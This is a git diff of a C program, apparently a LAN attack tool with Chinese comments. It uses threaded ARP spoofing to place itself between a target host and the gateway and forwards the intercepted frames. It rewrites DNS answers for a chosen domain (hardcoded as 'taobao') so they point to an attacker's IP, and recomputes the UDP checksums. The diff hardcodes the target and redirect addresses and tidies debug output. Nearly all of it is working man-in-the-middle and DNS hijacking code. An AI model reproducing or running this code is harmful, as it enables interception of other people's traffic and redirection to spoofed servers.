@@ -51,6 +51,7 @@ int one()
 			printf("%s -> %02x:%02x:%02x:%02x:%02x:%02x\n", p, mac[i][0], mac[i][1], mac[i][2], mac[i][3], mac[i][4], mac[i][5]);
 	}
 	printf("发现%d台主机.\n",size);
+    return 0;
 }
 
 int two()
@@ -92,7 +93,6 @@ int two()
 		printf(".......................................  ");
 		printf("目标ip:");
 		scanf("%s",p);
-		int i;
 		int dstip = inet_addr(p);
 		if(-1 == getmacbyip(p,mac))
 			return -1;
@@ -121,7 +121,6 @@ int two()
 		printf(".......................................  ");
 		printf("目标IP2:");
 		scanf("%s",p);
-		int i;
 		int dstip = inet_addr(p);
 		if(-1 == getmacbyip(p,mac))
 			return -1;
@@ -141,6 +140,7 @@ int two()
 	{
 		printf("输入错误.\n");
 	}
+    return 0;
 }
 
 static void *p_send_data(void *data)
@@ -182,20 +182,20 @@ static void *p_send_data(void *data)
 
 int three()
 {	
-	char target_ip[20]={0};
-	char hijack_domain[20]={0};
-    char redirect_ip[20]={0};
+	char target_ip[20]={"192.168.1.112"};
+	char hijack_domain[20]={"taobao"};
+    char redirect_ip[20]={"192.168.1.109"};
 
-	printf(".......................................  ");
-	printf("目标IP:");
-	scanf("%s",target_ip);
+	// printf(".......................................  ");
+	// printf("目标IP:");
+	// scanf("%s",target_ip);
 
-	printf("...劫持域名(如www.taobao.com，则输入taobao即可):");
-	scanf("%s",hijack_domain);
+	// printf("...劫持域名(如www.taobao.com，则输入taobao即可):");
+	// scanf("%s",hijack_domain);
 
-	printf(".....................................  ");
-	printf("重定向IP:");
-	scanf("%s",redirect_ip);
+	// printf(".....................................  ");
+	// printf("重定向IP:");
+	// scanf("%s",redirect_ip);
 
 	int dstip = inet_addr(target_ip);
 	unsigned char localmac[6],dstmac[6],gatewaymac[6];
@@ -243,22 +243,28 @@ int three()
 	pthread_create(&t, NULL, p_send_data, &arpdat); /* 开启一个线程用于dsthost欺骗 */
 	pthread_create(&t1, NULL, p_send_data, &arpdat2); /* 开启一个线程用于gateway欺骗 */
 
-    u16 _arp;
     u16 _ipv4;
     u16 _dns_port;
     _ipv4 = htons(ipv4_prot);
-    _arp = htons(arp_prot);
     _dns_port = htons(dns);
     
-    int send_enable = 1;
-    //char *Hdn[100] = {"taobao", NULL, "bdimg", "bdstatic", NULL};
-    //char *Hdn[100] = {"baidu", "bdimg", "bdstatic", NULL};
-    char *Hdn[100] = {hijack_domain};
-    u8 DNS_response_pack[1000]={0};
-	while(1)
-	{
+ //    int bufsize;
+	// int size = sizeof(bufsize);
+	// getsockopt(sock,SOL_SOCKET, SO_SNDBUF, &bufsize, &size);
+	// printf("buffsize:%d\n",bufsize);
+
+    char domain[100] = {0};
+    int i=0;
+    int totalsize = 0;
+    while(1)
+    {
 		int recv_size = recvfrom(sock, recv_buff, 5000, 0, NULL, NULL);
-        
+//        printf("size:%d\n",recv_size);
+//        totalsize += recv_size;
+//        printf("totalsize:%.3fMB  byte:%d %s\n",
+//        		totalsize/(1024.0*1024),totalsize,domain);//(float)totalsize/(1024.0*1024.0));
+        i++;
+        bzero(domain, 100);
         ip_datagram *ip = (ip_datagram *)recv_buff;
         
         /* 收到目标主机发送至网关的数据帧 只转发ip协议数据 */
@@ -275,11 +281,13 @@ int three()
         /* 收到网关发送至目标主机的数据帧 */
         if(ip->iphdr.dstip == dstip)
         {
+        	totalsize += recv_size;
+        	// printf("totalsize:%.3fMB  byte:%d\n",
+        	// 	totalsize/(1024.0*1024),totalsize);//(float)totalsize/(1024.0*1024.0));
         	udp_datagram *udp = (udp_datagram *)recv_buff;
             if((ip->ethhdr.type == _ipv4) && (ip->iphdr.protocol == udp_prot) && (udp->udphdr.srcport == _dns_port)) /* dns */
 	        {
             	/* 解析主机访问的域名 */
-                char domain[100] = {0};
                 dns_datagram *dnsframe = (dns_datagram *)recv_buff;
                 int length_1 = (int)dnsframe->domain[0];
                 char *p = dnsframe->domain;
@@ -287,7 +295,6 @@ int three()
                 int length_2 = (int)*p;
                 p++;
                 memcpy(domain, p, length_2);
-                printf("%s\n",domain);
                 
                 /* 计算问题数用总字节数，即域名部分占用的总字节数，后面修改IP地址时需要用到 */
                 p = dnsframe->domain;
@@ -297,20 +304,21 @@ int three()
                     question_length += 1;
                     p++;
                 }
-
+                printf("%s\n",domain);
                 question_length += 5;/*0x00 1byte 查询类型 查询类 4byte */
-                
+
                 int answernum = ntohs(dnsframe->answer_rrs); /* 服务器回答的数量 */
-                
-                int i = 0;
-            	if(0 == strcmp(domain, hijack_domain)) /* 如果目标访问的是被劫持域名，则修改数据包并返回给主机一个假的ip地址 */
-            	{
+
+                if(0 == strcmp(domain, hijack_domain)) /* 如果目标访问的是被劫持域名，则修改数据包并返回给主机一个假的ip地址 */
+                {
+                    
+                    
                     /* 修改的内容有：1.服务器响应IP */
                     /*               2.重新计算udp校验和，不然目标主机发现校验和是错误的将会丢弃该数据包*/
                     /* 1.修改服务器响应的IP地址，改成我们自己的服务器地址， 在服务器回答的内容找到类型是*/
                     /*   0x0001的内容，此类型里面包含了响应的IP地址*/
                     u8 *answer_c = (u8 *)(dnsframe->domain+question_length);
-            		while(answernum)
+                    while(answernum)
                     {
                         answernum--;
                         dns_answer *answer = (dns_answer *)answer_c;
@@ -320,13 +328,13 @@ int three()
                         }
                         answer_c = answer_c + 12 + ntohs(answer->datalength);
                     }
-                    
+
                     /* 计算UDP校验和，udp校验和需要包含3部分：1.udp伪首部 */
                     /*                                        2.udp首部*/
                     /*                                        3.udp数据部分*/
                     /* 1.udp伪首部 */
                     udp_whdr whdr;
-                    memset(&whdr, 0xaa, sizeof(whdr));
+                    memset(&whdr, 0x00, sizeof(whdr));
                     whdr.srcip = ip->iphdr.srcip;
                     whdr.dstip = ip->iphdr.dstip;
                     whdr.zero = 0;
@@ -345,12 +353,40 @@ int three()
                     /* 将原数据包中的检验和覆盖成新的校验和 */
                     dnsframe->udphdr.check_sum = check_sum((u16 *)&whdr,\
                     recv_size-sizeof(ip_datagram) + 12); /* +12是因为有12字节的udp伪首部 */
+
+                    // printf("-----%d-------%s-----------\n",i,domain);
+                    // printf("dst : %02x:%02x:%02x:%02x:%02x:%02x\n",\
+                    //         dstmac[0], dstmac[1], dstmac[2],\
+                    //         dstmac[3], dstmac[4], dstmac[5]);
+
+
+                    // printf("src : %02x:%02x:%02x:%02x:%02x:%02x\n",\
+                    //         localmac[0], localmac[1], \
+                    //         localmac[2], localmac[3], \
+                    //         localmac[4], localmac[5]);
+
             	}
-	        }   
+            }   
             memcpy(ip->ethhdr.dst,dstmac,6);
             memcpy(ip->ethhdr.src,localmac,6);
+            
+            // if((ip->ethhdr.type == _ipv4) && (ip->iphdr.protocol == udp_prot) && (udp->udphdr.srcport == _dns_port)) 
+            // {
+            //     printf("-----%d-------%s-----------\n",i,domain);
+            //     printf("dst : %02x:%02x:%02x:%02x:%02x:%02x\n",\
+            //             dstmac[0], dstmac[1], dstmac[2],\
+            //             dstmac[3], dstmac[4], dstmac[5]);
+
+
+            //     printf("src : %02x:%02x:%02x:%02x:%02x:%02x\n",\
+            //             localmac[0], localmac[1], \
+            //             localmac[2], localmac[3], \
+            //             localmac[4], localmac[5]);
+
+            // }
             if(recv_size != sendto(sock, recv_buff, recv_size, 0, (struct sockaddr*)&toaddr,sizeof(toaddr)))
             {
+                printf("size:%d\n",recv_size);
                 perror("send error");
             } 
         }
